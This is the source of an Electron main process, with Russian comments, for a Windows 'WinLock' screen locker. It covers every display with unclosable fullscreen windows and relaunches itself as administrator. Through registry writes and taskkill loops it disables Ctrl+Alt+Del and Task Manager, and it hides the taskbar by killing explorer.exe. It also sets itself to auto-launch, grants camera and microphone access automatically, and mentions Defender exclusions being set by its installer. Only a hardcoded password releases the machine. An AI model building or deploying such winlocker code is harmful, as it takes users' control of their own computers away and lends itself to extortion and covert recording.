const { app, BrowserWindow, globalShortcut, ipcMain, screen, dialog } = require('electron');
const path = require('path');
const AutoLaunch = require('auto-launch');
const fs = require('fs');
const { exec, spawn } = require('child_process');
const os = require('os');

let windows = [];
let mainWindow = null; // Главное окно приложения
const correctPassword = 'unlock123'; // Пароль для разблокировки
let isTemporarilyHidden = false;
let taskManagerMonitor = null; // Интервал для мониторинга диспетчера задач
let taskbarHidden = false; // Флаг скрытия панели задач

// Удален маркер первого запуска - теперь обрабатывается установщиком

// Функция проверки прав администратора
function isRunningAsAdmin() {
  try {
    // Попытка записи в системную папку
    const testFile = path.join(process.env.WINDIR, 'temp', 'admin-test.tmp');
    fs.writeFileSync(testFile, 'test');
    fs.unlinkSync(testFile);
    return true;
  } catch (error) {
    return false;
  }
}

// Функция для перезапуска с правами администратора
function restartAsAdmin() {
  const { spawn } = require('child_process');
  const exePath = process.execPath;
  
  // Запуск с правами администратора через PowerShell
  const psCommand = `Start-Process -FilePath "${exePath}" -Verb RunAs`;
  exec(`powershell -Command "${psCommand}"`, (error) => {
    if (error) {
      console.error('Ошибка при запуске с правами администратора:', error);
    }
    app.quit();
  });
}

// Функция для создания невидимого окна-перехватчика
function createInterceptorWindow() {
  const interceptor = new BrowserWindow({
    width: 1,
    height: 1,
    x: -10,
    y: -10,
    show: false,
    frame: false,
    transparent: true,
    alwaysOnTop: true,
    skipTaskbar: true,
    focusable: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true
    }
  });
  
  // Загружаем пустую страницу
  interceptor.loadURL('data:text/html,<html><body></body></html>');
  
  // Перехватываем все события клавиатуры на системном уровне
  interceptor.webContents.on('before-input-event', (event, input) => {
    // Блокируем Ctrl+Alt+Del и другие системные комбинации
    if (input.control && input.alt && input.key.toLowerCase() === 'delete') {
      console.log('🚫 ЗАБЛОКИРОВАН Ctrl+Alt+Del через перехватчик');
      event.preventDefault();
      
      // Возвращаем фокус на главное окно
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.focus();
        mainWindow.show();
        mainWindow.moveTop();
        mainWindow.setAlwaysOnTop(true);
        setTimeout(() => mainWindow.setAlwaysOnTop(false), 100);
      }
      return;
    }
    
    if (input.control && input.shift && input.key.toLowerCase() === 'escape') {
      console.log('🚫 ЗАБЛОКИРОВАН Ctrl+Shift+Esc через перехватчик');
      event.preventDefault();
      
      // Возвращаем фокус на главное окно
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.focus();
        mainWindow.show();
        mainWindow.moveTop();
        mainWindow.setAlwaysOnTop(true);
        setTimeout(() => mainWindow.setAlwaysOnTop(false), 100);
      }
      return;
    }
  });
  
  return interceptor;
}
function blockCtrlAltDel() {
  // Используем PowerShell с повышенными правами для блокировки SAS
  const psCommand = `Start-Process powershell -ArgumentList "-Command", "reg add 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v DisableCAD /t REG_DWORD /d 1 /f" -Verb RunAs -WindowStyle Hidden`;
  
  exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
    if (error) {
      console.error('❌ Ошибка блокировки Ctrl+Alt+Del:', error.message);
      // Альтернативный метод через групповые политики
      const altCommand = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableCAD /t REG_DWORD /d 1 /f`;
      exec(altCommand, (altError, altStdout, altStderr) => {
        if (altError) {
          console.error('❌ Альтернативная блокировка Ctrl+Alt+Del не удалась:', altError.message);
        } else {
          console.log('✅ Ctrl+Alt+Del заблокирован через пользовательские политики');
        }
      });
    } else {
      console.log('✅ Ctrl+Alt+Del заблокирован через системные политики');
    }
  });
}

// Функция для разблокировки Ctrl+Alt+Del
function unblockCtrlAltDel() {
  const regCommand = `reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableCAD /f`;
  
  exec(regCommand, (error, stdout, stderr) => {
    if (error) {
      console.log('ℹ️ Ctrl+Alt+Del уже разблокирован или не был заблокирован');
    } else {
      console.log('✅ Ctrl+Alt+Del разблокирован');
    }
  });
}

// Функция для блокировки Task Manager через реестр
function blockTaskManagerRegistry() {
  const regCommand = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f`;
  
  exec(regCommand, (error, stdout, stderr) => {
    if (error) {
      console.error('❌ Ошибка блокировки Task Manager через реестр:', error.message);
    } else {
      console.log('✅ Task Manager заблокирован через реестр');
    }
  });
}

// Функция для разблокировки Task Manager через реестр
function unblockTaskManagerRegistry() {
  const regCommand = `reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f`;
  
  exec(regCommand, (error, stdout, stderr) => {
    if (error) {
      console.log('ℹ️ Task Manager уже разблокирован или не был заблокирован');
    } else {
      console.log('✅ Task Manager разблокирован через реестр');
    }
  });
}
// Функции первого запуска удалены - теперь обрабатываются установщиком

// Функция временного скрытия окон
function temporarilyHideWindows() {
  if (isTemporarilyHidden) return;
  
  isTemporarilyHidden = true;
  windows.forEach(window => {
    if (window && !window.isDestroyed()) {
      window.hide();
    }
  });
  
  // Показать окна через 30 секунд
  setTimeout(() => {
    showWindows();
  }, 30000);
}

// Функция показа окон
function showWindows() {
    // Скрываем панель задач
  hideTaskbar();
  isTemporarilyHidden = false;
  windows.forEach(window => {
    if (window && !window.isDestroyed()) {
      window.show();
      window.focus();
    }
  });
}

// Функция для закрытия диспетчера задач
function closeTaskManager() {
  // Закрываем диспетчер задач несколькими способами
  exec('taskkill /F /IM Taskmgr.exe', (error, stdout, stderr) => {
    if (!error) {
      console.log('Диспетчер задач закрыт через taskkill');
    }
  });
  
  // Дополнительно закрываем через WMI
  exec('wmic process where name="Taskmgr.exe" delete', (error, stdout, stderr) => {
    if (!error && stdout.includes('deleted successfully')) {
      console.log('Диспетчер задач закрыт через WMI');
    }
  });
  
  // Закрываем окна диспетчера задач по заголовку
  exec('taskkill /F /FI "WINDOWTITLE eq Task Manager*"', (error, stdout, stderr) => {
    if (!error) {
      console.log('Окна диспетчера задач закрыты по заголовку');
    }
  });
}

// Функция для запуска мониторинга диспетчера задач
function startTaskManagerMonitoring() {
  if (taskManagerMonitor) {
    clearInterval(taskManagerMonitor);
  }
  
  console.log('Запуск мониторинга диспетчера задач...');
  taskManagerMonitor = setInterval(() => {
    // Проверяем и закрываем диспетчер задач
    exec('tasklist /FI "IMAGENAME eq Taskmgr.exe"', (error, stdout, stderr) => {
      if (!error && stdout.includes('Taskmgr.exe')) {
        console.log('Обнаружен диспетчер задач - закрываем...');
        closeTaskManager();
      }
    });
    
    // Также проверяем процессы с другими именами диспетчера задач
    exec('tasklist /FI "WINDOWTITLE eq Task Manager*"', (error, stdout, stderr) => {
      if (!error && stdout.includes('Task Manager')) {
        console.log('Обнаружено окно диспетчера задач - закрываем...');
        exec('taskkill /F /IM Taskmgr.exe', (killError) => {
          if (!killError) {
            console.log('Диспетчер задач принудительно закрыт');
          }
        });
      }
    });
  }, 500); // Проверяем каждые 500мс для быстрого реагирования
}

// Функция для остановки мониторинга диспетчера задач
function stopTaskManagerMonitoring() {
  if (taskManagerMonitor) {
    clearInterval(taskManagerMonitor);
    taskManagerMonitor = null;
  }
}

// Функция для скрытия панели задач
function hideTaskbar() {
  if (taskbarHidden) return;
  
  console.log('Скрытие панели задач...');
  
  // Простой и надежный метод через реестр
  const hideScript = 'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3" /v Settings /t REG_BINARY /d 30000000FEFFFFFF7AF400000300000030000000300000000000000003020000360700001E0400003607000000040000 /f; taskkill /f /im explorer.exe; Start-Sleep -Seconds 2; Start-Process explorer.exe';
  
  exec(`powershell -Command "${hideScript}"`, (error, stdout, stderr) => {
    if (error) {
      console.log('Ошибка при скрытии панели задач:', error);
      return;
    }
    
    console.log('Панель задач скрыта через реестр');
    taskbarHidden = true;
  });
}

// Функция для показа панели задач
function showTaskbar() {
  console.log('Восстановление панели задач...');
  
  // Простой метод через реестр
  const showScript = 'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3" /v Settings /f; taskkill /f /im explorer.exe; Start-Sleep -Seconds 2; Start-Process explorer.exe';
  
  exec(`powershell -Command "${showScript}"`, (error, stdout, stderr) => {
    if (error) {
      console.log('Ошибка при восстановлении панели задач:', error);
    } else {
      console.log('Панель задач восстановлена через реестр');
    }
    taskbarHidden = false;
  });
}

// Настройка автозагрузки
const autoLauncher = new AutoLaunch({
  name: 'CollonilTolliWinLock',
  path: app.getPath('exe')
});

// Функция настройки автозагрузки
async function setupAutoLaunch() {
  try {
    const isEnabled = await autoLauncher.isEnabled();
    
    if (!isEnabled) {
      await autoLauncher.enable();
      console.log('Автозагрузка включена');
    } else {
      console.log('Автозагрузка уже включена');
    }
  } catch (error) {
    console.error('Ошибка при настройке автозагрузки:', error);
  }
}

// Функция отключения автозагрузки
async function disableAutoLaunch() {
  try {
    const isEnabled = await autoLauncher.isEnabled();
    
    if (isEnabled) {
      await autoLauncher.disable();
      console.log('Автозагрузка отключена');
      
      await dialog.showMessageBox(null, {
        type: 'info',
        title: 'Автозагрузка отключена',
        message: 'CollonilTolliWinLock удален из автозагрузки',
        detail: 'Приложение больше не будет запускаться автоматически при включении компьютера.',
        buttons: ['OK']
      });
    } else {
      console.log('Автозагрузка уже отключена');
    }
  } catch (error) {
    console.error('Ошибка при отключении автозагрузки:', error);
  }
}

// Функция проверки статуса автозагрузки
async function checkAutoLaunchStatus() {
  try {
    const isEnabled = await autoLauncher.isEnabled();
    return isEnabled;
  } catch (error) {
    console.error('Ошибка при проверке статуса автозагрузки:', error);
    return false;
  }
}

function createWindows() {
  // Получаем все дисплеи
  const displays = screen.getAllDisplays();
  
  displays.forEach((display, index) => {
    // Создание окна браузера для каждого дисплея
    const window = new BrowserWindow({
      x: display.bounds.x,
      y: display.bounds.y,
      width: display.bounds.width,
      height: display.bounds.height,
      fullscreen: true,
      frame: false,
      alwaysOnTop: true,
      kiosk: true,
      resizable: false,
      movable: false,
      minimizable: false,
      maximizable: false,
      closable: false,
      skipTaskbar: true,
      focusable: true,
      show: false, // Создаем окно скрытым
      webPreferences: {
        nodeIntegration: true,
        contextIsolation: false,
        enableRemoteModule: true
      },
      webSecurity: false // Разрешаем доступ к камере и микрофону
    });

    // Разрешаем доступ к камере и микрофону
    window.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
      if (permission === 'media' || permission === 'camera' || permission === 'microphone') {
        callback(true); // Автоматически разрешаем
      } else {
        callback(false);
      }
    });

    // Главное окно (первый дисплей) использует index.html с полем ввода
    // Дополнительные окна используют secondary.html без поля ввода
    if (index === 0) {
      window.loadFile('index.html');
      mainWindow = window;
    } else {
      window.loadFile('secondary.html');
    }

    // Отключение меню
    window.setMenu(null);
    
    windows.push(window);
    
    // Предотвращение закрытия окна
    window.on('close', (event) => {
      event.preventDefault();
      return false;
    });

    // Умная блокировка потери фокуса - разрешаем ввод пароля
    window.on('blur', () => {
      if (!isTemporarilyHidden && !window.isDestroyed() && window.isVisible()) {
        // Проверяем, не переключился ли пользователь на другое приложение
        setTimeout(() => {
          if (!window.isDestroyed() && window.isVisible()) {
            // Получаем активное окно
            const focusedWindow = BrowserWindow.getFocusedWindow();
            
            // Если активное окно не наше - возвращаем фокус
            if (!focusedWindow || !windows.includes(focusedWindow)) {
              window.focus();
              window.show();
              window.moveTop();
            }
          }
        }, 100);
      }
    });
    
    // Блокировка минимизации
    window.on('minimize', (event) => {
      event.preventDefault();
      window.restore();
      window.focus();
    });
  });
  
  // Создаем невидимое окно-перехватчик для системных комбинаций
  // const interceptor = createInterceptorWindow();
  // windows.push(interceptor);
  
  // Регистрируем горячие клавиши после создания окон
  registerGlobalShortcuts();
  
  // Показываем окна только после полной инициализации
  console.log('Показ окон...');
  showWindows();
  console.log('Окна показаны, приложение готово к работе');
  
  // Запускаем мониторинг диспетчера задач
  startTaskManagerMonitoring();
  console.log('Мониторинг диспетчера задач активирован');
}

function registerGlobalShortcuts() {
  console.log('Регистрация глобальных горячих клавиш...');
  
  // Скрываем панель задач
  hideTaskbar();
  
  // Системная блокировка через реестр отключена из-за ошибок доступа
  // Используем только блокировку через globalShortcut
  // blockCtrlAltDel();
  // blockTaskManagerRegistry();

  // Отключаем глобальные горячие клавиши - используем только блокировку через реестр
  console.log('Глобальные горячие клавиши отключены - используется блокировка через реестр');
  console.log('✅ Блокировка диспетчера задач активна через реестр');
  
  // Мониторинг диспетчера задач отключен для предотвращения мерцания
  // startTaskManagerMonitoring();
}


// Обработчик проверки пароля
ipcMain.handle('check-password', (event, password) => {
  if (password === correctPassword) {
    console.log('Правильный пароль введен, разблокируем систему...');
    
    // Правильный пароль - разблокируем все системные функции
    globalShortcut.unregisterAll();
    
    // Останавливаем мониторинг диспетчера задач
    stopTaskManagerMonitoring();
    
    // Разблокируем диспетчер задач через реестр
    unblockTaskManagerRegistry();
    
    // Разблокируем Ctrl+Alt+Del
    unblockCtrlAltDel();
    
    // Восстанавливаем панель задач
    showTaskbar();
    
    console.log('✅ Система полностью разблокирована');
    
    // Закрываем все окна
    windows.forEach(window => {
      if (window && !window.isDestroyed()) {
        window.destroy();
      }
    });
    
    // Принудительно выходим из приложения
    setTimeout(() => {
      app.quit();
      process.exit(0);
    }, 100);
    
    return true;
  }
  return false;
});

// Обработчик сохранения видеофайлов

ipcMain.on('save-video-file', (event, data) => {
    try {
        const downloadsPath = path.join(os.homedir(), 'Downloads');
        const filePath = path.join(downloadsPath, data.filename);
        
        // Конвертируем ArrayBuffer в Buffer
        const buffer = Buffer.from(data.buffer);
        
        // Сохраняем файл
        fs.writeFileSync(filePath, buffer);
        
        console.log(`Видеофайл сохранен: ${filePath}`);
    } catch (error) {
        console.error('Ошибка сохранения видеофайла:', error);
    }
});

// Обработчик принудительного закрытия приложения
ipcMain.on('force-quit-app', () => {
    console.log('Принудительное закрытие приложения...');
    
    // Отключаем все горячие клавиши
    globalShortcut.unregisterAll();
    
    // Восстанавливаем системные функции
    unblockCtrlAltDel();
    unblockTaskManagerRegistry();
    showTaskbar();
    
    // Закрываем все окна
    BrowserWindow.getAllWindows().forEach(window => {
        if (window && !window.isDestroyed()) {
            window.destroy();
        }
    });
    
    // Принудительно выходим
    app.quit();
    process.exit(0);
});

// Обработчики для управления автозагрузкой
ipcMain.handle('enable-autolaunch', async () => {
  await setupAutoLaunch();
  return await checkAutoLaunchStatus();
});

ipcMain.handle('disable-autolaunch', async () => {
  await disableAutoLaunch();
  return await checkAutoLaunchStatus();
});

ipcMain.handle('check-autolaunch-status', async () => {
  return await checkAutoLaunchStatus();
});

// Обработчик для принудительного восстановления панели задач
ipcMain.handle('force-restore-taskbar', () => {
  console.log('Принудительное восстановление панели задач...');
  showTaskbar();
  return true;
});

// Этот метод будет вызван когда Electron завершит инициализацию
app.whenReady().then(async () => {
  console.log('Приложение готово к запуску...');
  
  // Проверяем права администратора
  if (!isRunningAsAdmin()) {
    console.log('Требуются права администратора. Перезапуск...');
    restartAsAdmin();
    return;
  }
  
  console.log('Права администратора подтверждены');
  
  // Автозагрузка и исключения Defender настраиваются установщиком
  console.log('Приложение запущено (автозагрузка настроена установщиком)');
  
  // Оптимизированная инициализация - все операции параллельно
  console.log('Быстрая инициализация системы...');
  
  // Параллельно выполняем все системные блокировки
  const systemOperations = [
    blockCtrlAltDel(),
    blockTaskManagerRegistry(),
    hideTaskbar()
  ];
  
  // Создаем окна сразу без ожидания системных операций
  createWindows();
  console.log('Окна созданы успешно');
  
  // Регистрируем глобальные горячие клавиши
  registerGlobalShortcuts();
  
  // Ждем завершения системных операций в фоне
  Promise.all(systemOperations).then(() => {
    console.log('Системные блокировки активированы');
  }).catch(error => {
    console.error('Ошибка при активации системных блокировок:', error);
  });
  
  // Запускаем мониторинг диспетчера задач
  startTaskManagerMonitoring();
  
  // Создаем окно-перехватчик
  createInterceptorWindow();
  
  // Добавляем обработчик для предотвращения закрытия
  setInterval(() => {
    console.log('Приложение работает...');
  }, 30000); // Увеличиваем интервал до 30 секунд

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindows();
  });
});

// Предотвращение выхода из приложения
app.on('window-all-closed', function () {
  // Не выходим из приложения даже если все окна закрыты
  return false;
});

// Блокировка второго экземпляра
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  app.quit();
} else {
  app.on('second-instance', () => {
    windows.forEach(window => {
      if (window && !window.isDestroyed()) {
        if (window.isMinimized()) window.restore();
        window.focus();
        window.moveTop();
      }
    });
  });
}

// Отключение всех горячих клавиш при выходе
app.on('will-quit', () => {
  stopTaskManagerMonitoring();
  globalShortcut.unregisterAll();
  
  // Восстанавливаем системные функции
  unblockCtrlAltDel();
  unblockTaskManagerRegistry();
  showTaskbar();
});